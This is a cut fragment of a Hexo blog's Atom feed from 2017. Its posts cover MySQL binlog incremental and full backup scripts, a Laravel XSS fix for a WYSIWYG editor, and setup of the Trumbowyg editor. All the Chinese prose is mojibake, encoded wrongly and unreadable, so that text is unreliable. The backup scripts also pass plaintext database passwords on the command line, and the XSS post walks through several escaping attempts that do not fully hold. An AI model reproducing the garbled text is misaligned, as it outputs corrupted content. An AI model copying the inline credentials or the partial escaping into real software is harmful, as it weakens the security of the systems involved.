ä½¿ç”¨gitå¤‡ä»½hexoæºæ–‡ä»¶</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;æ˜¯çš„ï¼Œæˆ‘æŠ˜è…¾äº†ä¸€å¤©æŠŠåšå®¢çš„æ¨¡ç‰ˆæ¢äº†ä¸€ä¸‹ã€‚æ€ä¹ˆè¯´å‘¢ï¼Œä¹‹å‰ç”¨çš„ Next ä¸»é¢˜ï¼Œå¾ˆç®€çº¦ï¼Œçœ‹èµ·æ¥ä¹Ÿå¾ˆèˆ’æœï¼Œä½†æ€»è§‰å¾—å°‘ç‚¹ä»€ä¹ˆï¼Œåæ¥é€›äº†é€›å…¶ä»–äººçš„ç«™ï¼Œæ„Ÿè§‰ Next ä¸»é¢˜æ²¡æœ‰å›¾ï¼Œè§†è§‰ä¸Šæ²¡ä»€ä¹ˆå†²å‡»åŠ›ï¼Œç°è’™è’™çš„æ„Ÿè§‰ï¼Œäºæ˜¯é‡‡ç”¨äº† material è¿™ä¸ªä¸»é¢˜ï¼Œä¹Ÿå¾ˆç®€æ´ï¼Œç›¸æ¯”ä¹‹ä¸‹è‰²å½©ä¸°å¯Œä¸€äº›ã€‚
      
    
    </summary>
    
      <category term="ä¸ªäººæ—¥è®°" scheme="https://blog.liebes.top/categories/%E4%B8%AA%E4%BA%BA%E6%97%A5%E8%AE%B0/"/>
    
    
      <category term="hexo-theme" scheme="https://blog.liebes.top/tags/hexo-theme/"/>
    
  </entry>
  
  <entry>
    <title>Mysql å¢é‡å¤‡ä»½ï¼Œå…¨éƒ¨å¤‡ä»½å®ç°æ–¹æ³•ä»¥åŠè‡ªåŠ¨åŒ–è„šæœ¬</title>
    <link href="https://blog.liebes.top/2017/10/20/mysql-backup/"/>
    <id>https://blog.liebes.top/2017/10/20/mysql-backup/</id>
    <published>2017-10-20T00:41:45.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰æƒ…æ‘˜è¦"><a href="#å‰æƒ…æ‘˜è¦" class="headerlink" title="å‰æƒ…æ‘˜è¦"></a>å‰æƒ…æ‘˜è¦</h2><p>è‡ªå·±ä½œæ­»å¹²äº†ä¸€ä»¶ç‰¹åˆ«è ¢çš„äº‹æƒ…ï¼ˆå…·ä½“ç•¥ï¼‰</p><p>ç„¶åå¼€å§‹ç ”ç©¶å¦‚ä½•è¿›è¡Œå¢é‡å¤‡ä»½</p><h2 id="å¢é‡å¤‡ä»½"><a href="#å¢é‡å¤‡ä»½" class="headerlink" title="å¢é‡å¤‡ä»½"></a>å¢é‡å¤‡ä»½</h2><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>mysql æœ‰ä¸ª binlog çš„åŠŸèƒ½ï¼Œä¼šè®°å½•æ‰€æœ‰çš„ç”¨æˆ·çš„æ“ä½œï¼Œå¯ä»¥ä¾é è¿™ä¸ªï¼Œé…åˆå…¨å¤‡ä»½ï¼Œå°†æ•°æ®åº“å›æ»šåˆ°æŸä¸€ä¸ªç‰¹æ®Šçš„æ—¶åˆ»ã€‚hhh</p><p>ç®€å•æ¥è¯´ï¼Œæ¯”å¦‚æˆ‘ä»¬æ¯å‘¨åšä¸€æ¬¡å…¨å¤‡ä»½ï¼Œæ¯å¤©åšä¸€æ¬¡å¢é‡å¤‡ä»½ï¼Œå½“æ•°æ®åº“å‘ç”Ÿé—®é¢˜çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±å¯ä»¥å…ˆå°†æ•°æ®åº“å›æ»šåˆ°ä¸Šä¸€å‘¨æˆ‘ä»¬çš„å…¨å¤‡ä»½çš„æ—¶é—´ï¼Œç„¶åå†é€šè¿‡æ¯å¤©çš„å¢é‡å¤‡ä»½ï¼ˆå…¶å®å°±æ˜¯æ¨¡æ‹Ÿæ‰€æœ‰çš„æ•°æ®åº“æ“ä½œï¼Œå…¨éƒ¨æ‰§è¡Œä¸€éï¼‰ï¼Œå°†æ•°æ®æ¢å¤åˆ°æˆ‘ä»¬æƒ³è¦çš„æ—¶é—´ç‚¹ã€‚</p><h3 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><p>mysql çš„ binlog åŠŸèƒ½éœ€è¦åœ¨é…ç½®æ–‡ä»¶ä¸­æ‰“å¼€ï¼Œåœ¨ my.cnf æˆ–è€… mysqld.cnf ä¸­æ·»åŠ ä»¥ä¸‹å‡ è¡Œï¼š</p><pre><code class="shell">server-id               = 1# binlogå­˜æ”¾è·¯å¾„log_bin                 = /var/log/mysql/mysql-bin.log# binlogè®°å½•çš„æ ¼å¼ï¼Œæœ‰rowã€statementã€mixedä¸‰ç§é€‰é¡¹binlog-format           = row# binlogå†™ç¼“å†²åŒºè®¾ç½®å¤§å°ï¼Œç”±äºæ˜¯å†…å­˜ï¼Œå†™é€Ÿåº¦éå¸¸å¿«ï¼Œå¯ä»¥æœ‰æ•ˆæé«˜binlogçš„å†™æ•ˆç‡ï¼Œå¦‚æœæ•°æ®åº“ä¸­ç»å¸¸å‡ºç°å¤§äº‹åŠ¡ï¼Œå¯ä»¥é…Œæƒ…æé«˜è¯¥å‚æ•°ã€‚binlog_cache_size       = 32m# æœ€å¤§ç¼“å­˜åŒºå¤§å°max_binlog_cache_size   = 512m# binlogæ–‡ä»¶æœ€å¤§çš„å¤§å°max_binlog_size         = 1000m# éœ€è¦å¤‡ä»½çš„æ•°æ®åº“åï¼Œå¦‚æœå¤‡ä»½å¤šä¸ªæ•°æ®åº“ï¼Œé‡å¤è®¾ç½®è¿™ä¸ªé€‰é¡¹å³å¯binlog-do-db=game     binlog-do-db=platform# ä¸éœ€è¦å¤‡ä»½çš„æ•°æ®åº“ï¼Œå¦‚æœå¤‡ä»½å¤šä¸ªæ•°æ®åº“ï¼Œé‡å¤è®¾ç½®è¿™ä¸ªé€‰é¡¹å³å¯binlog-ignore-db=</code></pre><p>é‡å¯mysqlæœåŠ¡ï¼Œåœ¨å¯¹åº”çš„æ–‡ä»¶å¤¹ä¸‹(è¿™é‡Œæ˜¯<code>/var/log/mysql</code>)ä¼šçœ‹åˆ° <code>mysql-bin.000001</code> å’Œ <code>mysql-bin.index</code> ä¸¤ä¸ªæ–‡ä»¶ï¼Œç¬¬ä¸€ä¸ªå°±æ˜¯æˆ‘ä»¬éœ€è¦çš„ binlog æ–‡ä»¶ï¼Œé‡Œé¢ä¼šè®°å½•æˆ‘ä»¬çš„æ“ä½œï¼Œç¬¬äºŒä¸ªè´Ÿè´£è®°å½• binlog çš„åç§°ï¼Œå¯ä»¥ç”¨æ¥åˆ¤æ–­å½“å‰æœ€æ–°çš„ binlog æ˜¯å“ªä¸€ä¸ª</p><h3 id="ä¸€äº›ç›¸å…³çš„æ“ä½œ"><a href="#ä¸€äº›ç›¸å…³çš„æ“ä½œ" class="headerlink" title="ä¸€äº›ç›¸å…³çš„æ“ä½œ"></a>ä¸€äº›ç›¸å…³çš„æ“ä½œ</h3><p>å¼€å¯äº†binlogä¹‹åï¼Œå°±å¯ä»¥è¿›è¡Œä¸€äº›å°è¯•äº†ï¼Œå¯ä»¥å…ˆå»æ•°æ®åº“åšä¸€äº›ä¿®æ”¹æ“ä½œã€‚ï¼ˆå› ä¸ºbinlogçš„æ ¼å¼é€‰æ‹©çš„æ˜¯rowï¼Œæ‰€ä»¥selectè¯­å¥æ˜¯ä¸ä¼šè¢«è®°å½•çš„ï¼‰</p><pre><code class="mysql">mysql&gt; UPDATE ....mysql&gt; DELETE ....// æŸ¥çœ‹å½“å‰logçš„å¤‡ä»½æƒ…å†µmysql&gt; show master logs;// æŸ¥çœ‹æœ€æ–°çš„å¤‡ä»½æ–‡ä»¶çš„æƒ…å†µmysql&gt; show master status;// å°†å½“å‰çš„logå†™å…¥ç£ç›˜ï¼Œå¹¶åˆ›å»ºæ–°çš„binlogæ–‡ä»¶mysql&gt; flush log;</code></pre><p>binlog æ–‡ä»¶å¯ä»¥ä½¿ç”¨ mysqlbinlog å‘½ä»¤æŸ¥çœ‹</p><pre><code class="mysql">// æŸ¥çœ‹binlogfileå³å¯çœ‹åˆ°è¿™ä»½logä¸­è®°å½•çš„æ•°æ®åº“æ“ä½œmysqlbinlog mysql-bin.000011 &gt; /tmp/binlogfile// è·å–æŒ‡å®šä½ç½®èŒƒå›´çš„è®°å½•mysqlbinlog --start-position=1285 --stop-position=1681 mysql-bin.000011 &gt; /tmp/binlogfile// è·å–æŒ‡å®šæ—¶é—´èŒƒå›´å†…çš„è®°å½•ï¼Œå¸¸ç”¨mysqlbinlog --start-date=&quot;2012-10-15 16:30:00&quot; --stop-date=&quot;2012-10-15 17:00:00&quot;</code></pre><h2 id="å…¨å¤‡ä»½"><a href="#å…¨å¤‡ä»½" class="headerlink" title="å…¨å¤‡ä»½"></a>å…¨å¤‡ä»½</h2><p>å…¨å¤‡ä»½æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œmysqldumpä¸€æ¡å‘½ä»¤å°±å¯ä»¥äº†</p><pre><code>mysqldump -uroot -ppwd --quick --all-databases --flush-logs --delete-master-logs --single-transaction &gt; $dumpFile</code></pre><p>æ³¨æ„é‡Œé¢çš„ä¸€äº›å‚æ•°ï¼Œå°¤å…¶æ˜¯flush-logså’Œsingle-transactionä¸¤ä¸ªå‚æ•°ï¼Œå»ºè®®å¼€å¯</p><h2 id="è‡ªåŠ¨åŒ–è„šæœ¬"><a href="#è‡ªåŠ¨åŒ–è„šæœ¬" class="headerlink" title="è‡ªåŠ¨åŒ–è„šæœ¬"></a>è‡ªåŠ¨åŒ–è„šæœ¬</h2><p>å…¨å¤‡ä»½</p><pre><code class="shell">#!/bin/bash# å…¨å¤‡ä»½è·¯å¾„backDir=/var/log/mysql/backup/weekly# æ—¥å¿—æ–‡ä»¶logFile=/var/log/mysql/backup/bak-all.log# è·å–å½“å‰æ—¶é—´ï¼Œç”¨äºå‘½ånowDate=`date +%Y%m%d`beginTime=`date +&quot;%Y%m%d %H:%M:%S&quot;`# è¿›å…¥å¤‡ä»½æ–‡ä»¶å¤¹cd $backDirdumpFile=$nowDate.sqldumpFileTgz=$nowDate.sql.tgz# mysqldump å¯¼å‡ºæ‰€æœ‰æ•°æ®åº“echo dumping...mysqldump -uroot -ppwd --quick --all-databases --flush-logs --delete-master-logs --single-transaction &gt; $dumpFileecho compressing...# å‹ç¼©æ–‡ä»¶tar czvf $dumpFileTgz $dumpFilerm $dumpFileendTime=`date +&quot;%Y%m%d %H:%M:%S&quot;`echo begin:$beginTime end:$endTime $dumpFileTgz succ &gt;&gt; $logFile# æ¸…æ¥šä¹‹å‰çš„å¢é‡å¤‡ä»½cd $backDir/../dailyrm -f *</code></pre><p>å¢é‡å¤‡ä»½è„šæœ¬</p><pre><code>#!/bin/bash# å¢é‡å¤‡ä»½å­˜æ”¾è·¯å¾„backDir=/var/log/mysql/backup/daily# binlogå­˜æ”¾è·¯å¾„binDir=/var/log/mysql/# æ—¥å¿—æ–‡ä»¶logFile=/var/log/mysql/backup/bak-daily.log# binlog.index æ–‡ä»¶è·¯å¾„binIndex=/var/log/mysql/mysql-bin.index# å°†å½“å‰æ‰€æœ‰çš„æ—¥å¿—å†™åˆ°ç£ç›˜ï¼Œä¼šæ–°å»ºä¸€ä¸ª00000*çš„binlogæ–‡ä»¶mysqladmin -uroot -phhxxttxs flush-logs# è·å–å½“å‰æœ‰å‡ æ¡binlogæ–‡ä»¶ï¼ˆéœ€è¦ä¿è¯æ˜¯ä»1å¼€å§‹çš„ï¼‰count=`wc -l $binIndex | awk &#39;{print $1}&#39;`nextNum=0for file in  `cat $binIndex`do    # è·å–æ–‡ä»¶åï¼Œå»é™¤æ–‡ä»¶å¤¹å    base=`basename $file`    # éå†æ¯ä¸ªbinlogæ–‡ä»¶ï¼Œå¦‚æœæ˜¯æœ€æ–°çš„ä¸åšæ“ä½œï¼Œå¦åˆ™å¤‡ä»½    nextNum=`expr $nextNum + 1`    if [ $nextNum -eq $count ]    then        echo $base skip!  &gt;&gt; $logFile    else        dest=$backDir/$base        # file already exist        if(test -e $dest)        then            echo  $base exist! &gt;&gt; $logFile           else            cp $binDir/$base $backDir            echo $base copyed &gt;&gt; $logFile        fi    fidoneecho `date +&quot;%Y%m%d %H:%M:%S&quot;` Backup succ! &gt;&gt; $logFile</code></pre><p>åšä¸€ä¸‹å®šæ—¶å°±å¥½äº†</p><h2 id="å…·ä½“æ¢å¤æ“ä½œ"><a href="#å…·ä½“æ¢å¤æ“ä½œ" class="headerlink" title="å…·ä½“æ¢å¤æ“ä½œ"></a>å…·ä½“æ¢å¤æ“ä½œ</h2><p>å½“å‘ç°æ•°æ®ä¸¢å¤±æ—¶</p><ol><li>ç¡®è®¤ä¸¢å¤±æ•°æ®çš„å¼€å§‹æ—¶é—´</li><li>æ‰¾åˆ°è·ç¦»è¿™ä¸ªæ—¶é—´æœ€è¿‘çš„å…¨é‡å¤‡ä»½</li><li>mysql -uuser -p &lt; all.sql</li><li>ä¾æ¬¡è¿è¡Œä»å…¨å¤‡ä»½åˆ°ä¸¢å¤±æ—¶é—´ä¹‹é—´çš„å¢é‡å¤‡ä»½</li><li>mysqlbinlog mysql-bin.000123 â€“start-date=â€â€ â€“end-date=â€â€ &gt; /tmp/tmpfile</li><li>mysql -uuser -p &lt; /tmp/tmpfile</li></ol><p>é€šè¿‡ä»¥ä¸Šï¼Œå°±å¯ä»¥å°†æ•°æ®è¿˜åŸåˆ°éœ€è¦çš„è¿˜åŸç‚¹ã€‚<br>è®°å¾—å®šæœŸæŸ¥çœ‹å¤‡ä»½çš„logæ–‡ä»¶ï¼Œä»¥é˜²å‡ºç°é—®é¢˜ï¼Œå…¨å¤‡ä»½éœ€è¦å®šæ—¶æ¸…ç†</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å‰æƒ…æ‘˜è¦&quot;&gt;&lt;a href=&quot;#å‰æƒ…æ‘˜è¦&quot; class=&quot;headerlink&quot; title=&quot;å‰æƒ…æ‘˜è¦&quot;&gt;&lt;/a&gt;å‰æƒ…æ‘˜è¦&lt;/h2&gt;&lt;p&gt;è‡ªå·±ä½œæ­»å¹²äº†ä¸€ä»¶ç‰¹åˆ«è ¢çš„äº‹æƒ…ï¼ˆå…·ä½“ç•¥ï¼‰&lt;/p&gt;
&lt;p&gt;ç„¶åå¼€å§‹ç ”ç©¶å¦‚ä½•è¿›è¡Œå¢é‡å¤‡ä»½&lt;/p&gt;
&lt;h2 id=&quot;å¢é‡å¤‡ä»½&quot;&gt;&lt;a
      
    
    </summary>
    
    
      <category term="mysql" scheme="https://blog.liebes.top/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>ç¼–è¾‘å™¨å¸¦æ¥çš„XSSæ¼æ´é—®é¢˜è§£å†³æ–¹æ¡ˆ</title>
    <link href="https://blog.liebes.top/2017/07/11/editor-xss/"/>
    <id>https://blog.liebes.top/2017/07/11/editor-xss/</id>
    <published>2017-07-11T20:47:08.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>æ¥ä¸Šä¸€ç¯‡ç¼–è¾‘å™¨çš„ä½¿ç”¨ï¼Œè‡ªå·±å°è¯•ç€å†™äº†ä¸€æ®µjsä»£ç ï¼Œæœ¬ä»¥ä¸ºlaravelçš„</p><pre><code>{{ $item }}</code></pre><p>æ¸²æŸ“å¯ä»¥å®Œç¾çš„é¿å… XSS çš„æ”»å‡»ï¼ˆç¡®å®å¯ä»¥é¿å…ï¼‰ï¼Œä½†æ˜¯ç”±äº Editor ç”Ÿæˆçš„æ—¶å€™ï¼Œé‡æ–°æ¸²æŸ“äº†ä¸€éï¼Œå¯¼è‡´äº†å¯èƒ½å‡ºç°çš„XSSæ¼æ´ã€‚</p><p><img src="/images/2017-7-11-20-51.png" alt="Pic"></p><p><img src="/images/2017-7-11-20-52.png" alt="Pic"></p><p>å¯ä»¥çœ‹åˆ°ï¼ŒEditorå·²ç»å¸®åŠ©æˆ‘ä»¬åšäº†htmlçš„ç¼–ç ï¼Œäºæ˜¯æˆ‘è§‰å¾—ä¸éœ€è¦è¿›è¡ŒäºŒæ¬¡ç¼–ç ï¼Œå°±ç›´æ¥å­˜åˆ°äº†æ•°æ®åº“é‡Œï¼Œå¹¶ä¸”ç›´æ¥åœ¨å‰ç«¯è¿›è¡Œäº†æ¸²æŸ“ã€‚</p><p>Controller</p><pre><code class="php">$res = Notification::updateById($notice_id, [                &#39;content&#39;   =&gt; $content,                &#39;title&#39;     =&gt; $title,                &#39;fileName&#39;  =&gt; $file_name,                &#39;filePath&#39;  =&gt; $file_path            ]);</code></pre><p>view</p><pre><code class="html">&lt;textarea id=&quot;editor&quot; name=&quot;editor&quot; rows=&quot;10&quot; cols=&quot;80&quot;&gt;    {{ $notice['content'] }}&lt;/textarea&gt;</code></pre><p>çœ‹èµ·æ¥ä¸€ç‚¹é—®é¢˜ä¹Ÿæ²¡æœ‰å¯¹ä¸å¯¹ï¼ï¼</p><p>ç„¶è€Œå½“æ¸²æŸ“çš„æ—¶å€™ç¼ºå¼¹å‡ºäº†ä¸€ä¸ªæ¡†æ¡†Â·Â·Â·Â·Â·Â·</p><p><img src="/images/2017-7-11-21-02.png" alt="Pic"></p><p>æŸ¥çœ‹ä»£ç å‘ç°å˜æˆäº†æ•´ä¸ªæ ·å­</p><p><img src="/images/2017-7-11-21-03.png" alt="Pic"></p><p>å“‡ï¼Œè¯´å¥½çš„å‰ç«¯æ¸²æŸ“å¯ä»¥é˜²æ­¢XSSå‘¢ï¼ï¼ï¼</p><p>åœ¨é¹é¹çš„å¸®åŠ©ä¸‹ï¼Œå‘ç°äº†åŸå› ï¼Œå°½ç®¡æˆ‘ä»¬åœ¨ editor ä¸­è¾“å…¥çš„æ¶æ„ä»£ç ç»è¿‡äº†è½¬ä¹‰ï¼Œä½†æ˜¯Editorä¼šåœ¨DomåŠ è½½å®Œæˆåå†è¿›è¡Œä¸€æ¬¡æ¸²æŸ“ï¼Œå¯¼è‡´ç¬¬ä¸€æ¬¡åŠ è½½Domæ—¶ï¼Œè¢«è½¬ä¹‰è¿‡çš„ html entity è¢«è§£ææˆäº†æ­£ç¡®çš„å­—ç¬¦ï¼Œè€ŒEditoré‡æ–°è·å–è¿™äº›è§£æåçš„å†…å®¹ï¼Œå†ä¸€æ¬¡è¾“å‡ºåˆ°äº†ç•Œé¢ä¸Šï¼Œå¯¼è‡´äº†æœ€åçš„æ¶æ„ä»£ç æ‰§è¡Œã€‚</p><p>äºæ˜¯æˆ‘åœ¨åå°å¤„ç†çš„æ—¶å€™è¿›è¡Œäº†ä¸€æ¬¡è½¬ä¹‰</p><p>Controller</p><pre><code class="php">$res = Notification::updateById($notice_id, [                &#39;content&#39;   =&gt; htmlspecialchars($content),                &#39;title&#39;     =&gt; $title,                &#39;fileName&#39;  =&gt; $file_name,                &#39;filePath&#39;  =&gt; $file_path            ]);</code></pre><p>è¿™ä¸€æ¬¡è§£å†³äº†å½“å‰çš„é—®é¢˜ï¼Œæ¶æ„ä»£ç ä»¥å­—ç¬¦å½¢å¼æ˜¾ç¤ºäº†å‡ºæ¥</p><p><img src="/images/2017-7-11-21-14.png" alt="Pic"></p><p>ç„¶è€Œï¼Œæœ‰ä¸€ç§ä¸œè¥¿å«åš Postmanï¼Œåœ¨è¿™é‡Œçš„è¾“å…¥å¯ä¸ä¼šä¹–ä¹–çš„å‘Editorä¸€æ ·å¸®ä½ åšå¥½è½¬ä¹‰</p><p>Okï¼Œä½ è·Ÿæˆ‘è¯´laravel æœ‰ csrftoken ä¿æŠ¤ï¼Œä½†ç†è®ºä¸Šæ˜¯å¯ä»¥å®Œå…¨æ¨¡æ‹Ÿæµè§ˆå™¨è¯·æ±‚çš„ï¼ˆè™½ç„¶æˆ‘ä¸ä¼šï¼‰</p><p>äºæ˜¯æˆ‘é‡‡å–äº†è¿™æ ·çš„æ–¹æ³•ï¼Œåˆ æ‰ä½ çš„ Editor ï¼Œæ²¡é”™å°±æ˜¯è¿™ä¹ˆæš´åŠ›ï¼Œåªåœ¨Domæ ‘é‡Œé¢ç•™ä¸‹Textareaçš„ä¸œè¥¿</p><p><img src="/images/2017-7-11-21-29.png" alt="Pic"></p><p>äºæ˜¯ï¼Œè¯¥æ­»çš„æ³¨å…¥åˆå‡ºç°äº†</p><p><img src="/images/2017-7-11-21-33.png" alt="Pic"></p><p>æŸ¥çœ‹ä»£ç å‘ç°è½¬ä¹‰åˆå¤±æ•ˆäº†ï¼ŒMMPï¼ï¼ï¼</p><p><img src="/images/2017-7-11-21-34.png" alt="Pic"></p><p>å…¶å®åŸå› ä¹Ÿå¾ˆç®€å•ï¼Œæœ€å¼€å§‹æˆåŠŸçš„åŸå› æ˜¯æˆ‘ä»¬å‡è®¾ä¹‹å‰çš„æ¶æ„ä»£ç å·²ç»è¢«è½¬ä¹‰ä¸€æ¬¡äº†ï¼Œé‚£ä¹ˆç”±äºEditorçš„æœºåˆ¶ï¼Œæˆ‘ä»¬åªéœ€è¦è¿›è¡ŒäºŒæ¬¡è½¬ä¹‰å°±å¯ä»¥äº†ã€‚ä½†æ˜¯ï¼Œè¿™ä¸€æ¬¡æ¶æ„ä»£ç æ²¡æœ‰åƒæˆ‘ä»¬æƒ³çš„é‚£æ ·ç»è¿‡äº†è½¬ä¹‰ã€‚</p><p>é‚£åœ¨æ¸²æŸ“çš„æ—¶å€™å†è½¬ä¹‰ä¸€æ¬¡ä¸å°±å¥½äº†ï¼Œå“¼å”§</p><p>äºæ˜¯æˆ‘åˆä¿®æ”¹äº†æˆ‘çš„viewä»£ç ï¼Œç°åœ¨Controllerå’Œviewçœ‹èµ·æ¥æ˜¯è¿™ä¸ªæ ·å­çš„ï¼š</p><p>Controller</p><pre><code class="php">$res = Notification::updateById($notice_id, [                &#39;content&#39;   =&gt; htmlspecialchars($content),                &#39;title&#39;     =&gt; $title,                &#39;fileName&#39;  =&gt; $file_name,                &#39;filePath&#39;  =&gt; $file_path            ]);</code></pre><p>View</p><pre><code class="html"> {!! htmlspecialchars($notice[&#39;content&#39;]) !!}</code></pre><p>è¿™ä¸‹æ€»ä¸‡äº‹å¤§å‰äº†å§ï¼Œç»“æœ</p><p><img src="/images/2017-7-11-21-42.png" alt="Pic"></p><p>WTFï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</p><p>å¥½å§ï¼Œæˆ‘è‡ªå·±ä½œæ­»è½¬ä¹‰äº†ä¸¤æ¬¡ï¼Œæ¶æ„ä»£ç æ˜¯é˜²ä½äº†ï¼Œæ­£å¸¸ä»£ç ä¹Ÿè¢«å¹²æ‰äº†ã€‚</p><p>å¥½å§æˆ‘æ‰¿è®¤å…¶å®ä»è¿™é‡Œå¼€å§‹æ‰æ˜¯æœ‰ç”¨çš„ä¸œè¥¿</p><p>åœ¨ç¬¬ä¸€æ¬¡è½¬ä¹‰çš„æ—¶å€™é¿å…äºŒæ¬¡è½¬ä¹‰ï¼Œç¬¬äºŒæ¬¡è½¬ä¹‰æ­£å¸¸è½¬ä¹‰ï¼Œå¯ä»¥å®Œç¾çš„è§£å†³è¿™ä¸ªé—®é¢˜</p><p>Controller</p><pre><code class="php">$res = Notification::updateById($notice_id, [      // é˜²æ­¢ç¼–è¾‘å™¨xssæ”»å‡»ï¼Œè¿™é‡Œè¿›è¡Œè½¬ä¹‰ï¼ŒåŒæ—¶é¿å…äºŒæ¬¡ç¼–ç       &#39;content&#39;   =&gt; htmlspecialchars($content, ENT_COMPAT | ENT_HTML401, ini_get(&quot;default_charset&quot;) , false),      &#39;title&#39;     =&gt; $title,      &#39;fileName&#39;  =&gt; $file_name,      &#39;filePath&#39;  =&gt; $file_path]);</code></pre><p>View</p><pre><code class="html"> {!! htmlspecialchars($notice[&#39;content&#39;]) !!}</code></pre><p>å¥½äº†ï¼Œä¸–ç•Œå®‰é™äº†ï¼Œå»**çš„XSSã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;æ¥ä¸Šä¸€ç¯‡ç¼–è¾‘å™¨çš„ä½¿ç”¨ï¼Œè‡ªå·±å°è¯•ç€å†™äº†ä¸€æ®µjsä»£ç ï¼Œæœ¬ä»¥ä¸ºlaravelçš„&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{{ $item }}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æ¸²æŸ“å¯ä»¥å®Œç¾çš„é¿å… XSS çš„æ”»å‡»ï¼ˆç¡®å®å¯ä»¥é¿å…ï¼‰ï¼Œä½†æ˜¯ç”±äº Editor ç”Ÿæˆçš„æ—¶å€™ï¼Œé‡æ–°æ¸²æŸ“äº†ä¸€éï¼Œå¯¼è‡´äº†å¯èƒ½
      
    
    </summary>
    
      <category term="ä¸ªäººæ—¥è®°" scheme="https://blog.liebes.top/categories/%E4%B8%AA%E4%BA%BA%E6%97%A5%E8%AE%B0/"/>
    
    
      <category term="editor" scheme="https://blog.liebes.top/tags/editor/"/>
    
      <category term="xss" scheme="https://blog.liebes.top/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>Trumbowyg è½»é‡çº§çš„ WYSIWYG ç¼–è¾‘å™¨ï¼ˆé™„å¸¦ Laravel æ–‡ä»¶ä¸Šä¼ ï¼‰</title>
    <link href="https://blog.liebes.top/2017/07/10/trumbowyg-file-upload/"/>
    <id>https://blog.liebes.top/2017/07/10/trumbowyg-file-upload/</id>
    <published>2017-07-10T19:35:32.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>å‡æœŸå†™ä»£ç ï¼Œæ•´ç†ä¸€äº›å…³äºEditorï¼Œæ–‡ä»¶ä¸Šä¼ ç›¸å…³çš„ä¸œè¥¿ã€‚</p><ul><li><a href="#editor">editor</a></li><li><a href="#upload">æ–‡ä»¶ä¸Šä¼ ï¼ˆLaravelï¼‰</a></li></ul><h2 id="editor">Trumbowyg Editor</h2><p>Trumbowyg æ˜¯ä¸€æ¬¾è½»é‡çº§çš„ç¼–è¾‘å™¨ï¼Œå¯ä»¥é«˜åº¦DIYï¼Œç•Œé¢ä¹Ÿå¾ˆç®€æ´ã€‚</p><p>å®˜æ–¹ç½‘ç«™ï¼š<a href="https://alex-d.github.io/Trumbowyg/" target="_blank" rel="noopener">Trumbowyg</a></p><p>é¦–å…ˆä¸‹è½½å®˜æ–¹åŒ…ï¼Œåœ¨å®˜ç½‘å¯ä»¥ç›´æ¥ä¸‹è½½ã€‚</p><p>ç›®å½•ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="/images/2017-7-10-7-47.png" alt="Pic"></p><p>å…¶ä¸­åªéœ€è¦ç•™ä¸‹ dist æ–‡ä»¶å¤¹å³å¯ï¼Œå…¶ä½™çš„æ˜¯æ–‡æ¡£ï¼Œä¾‹å­ï¼Œç›´æ¥åˆ é™¤å³å¯ã€‚</p><p>ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œåœ¨ view ç•Œé¢å¼•ç”¨ç›¸å…³çš„ css æ–‡ä»¶ä¸ js æ–‡ä»¶ï¼Œè¿™é‡Œé»˜è®¤å·²ç»å¼•ç”¨äº†Jquery</p><pre><code class="html">&lt;link rel=&quot;stylesheet&quot; href=&quot;/Trumbowyg/dist/ui/trumbowyg.min.css&quot;&gt;&lt;script src=&quot;/Trumbowyg/dist/trumbowyg.js&quot;&gt;&lt;/script&gt;</code></pre><p>åŒæ—¶éœ€è¦åˆ›å»ºä¸€ä¸ª <code>textarea</code> ä½œä¸º editor çš„å®¹å™¨</p><pre><code>&lt;textarea id=&quot;editor&quot; name=&quot;editor&quot; rows=&quot;10&quot; cols=&quot;80&quot;&gt;&lt;/textarea&gt;</code></pre><p>æ¥ä¸‹æ¥å°±å¯ä»¥ä½¿ç”¨Trumbowyg åˆ›å»ºä¸€ä¸ªç¼–è¾‘å™¨å‡ºæ¥</p><pre><code class="html">&lt;script&gt;        $(&#39;#editor&#39;).trumbowyg({            btnsDef: {                // è®¾ç½®ä¸Šä¼ çš„3ç§æ–¹æ³•ï¼Œè¿œç¨‹ä¸Šä¼ ï¼Œæœ¬åœ°ä¸Šä¼ ï¼Œå›¾ç‰‡64ä½åŠ å¯†                image: {                    dropdown: [&#39;insertImage&#39;, &#39;upload&#39;],                    ico: &#39;insertImage&#39;                }            },            btns: [                [&#39;viewHTML&#39;],                [&#39;formatting&#39;],                &#39;btnGrp-design&#39;,                [&#39;superscript&#39;, &#39;subscript&#39;],                &#39;image&#39;,                &#39;btnGrp-justify&#39;,                &#39;btnGrp-lists&#39;,                [&#39;horizontalRule&#39;],                [&#39;table&#39;],                [&#39;foreColor&#39;, &#39;backColor&#39;],                [&#39;removeformat&#39;],                [&#39;fullscreen&#39;]            ],            plugins: {                upload: {                    serverPath: &#39;/manager/file&#39;,                    fileFieldName: &#39;upload&#39;,                    usage : &#39;notice&#39;                }            },            autogrow: true        });    &lt;/script&gt;</code></pre><p>å…¶ä¸­ <code>btnsDef</code> æ˜¯è‡ªå·±å®šä¹‰çš„æŒ‰é’®ç»„ï¼Œ<code>btns</code> æ˜¯æ˜¾ç¤ºå‡ºæ¥çš„æŒ‰é’®ï¼Œä¸‹é¢æ˜¯æ–‡ä»¶ä¸Šä¼ æ’ä»¶ã€‚<code>autogrow</code> å‚æ•°å®šä¹‰äº†æ–‡æœ¬åŸŸçš„è‡ªåŠ¨ç¼©æ”¾</p><p>æ˜¾ç¤ºå‡ºæ¥çš„æ•ˆæœå¦‚ä¸‹ï¼š</p><p><img 